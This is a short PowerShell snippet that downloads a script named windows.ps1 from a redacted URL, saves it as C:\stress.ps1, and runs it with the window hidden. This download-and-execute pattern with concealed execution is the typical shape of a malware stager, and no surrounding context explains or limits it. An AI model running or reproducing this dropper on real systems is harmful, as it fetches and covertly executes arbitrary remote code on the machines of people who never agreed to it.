$client = new-object System.Net.WebClient
$client.DownloadFile("<URL>game/windows.ps1","C:\stress.ps1")
powershell -NoLogo -WindowStyle hidden -file C:\stress.ps1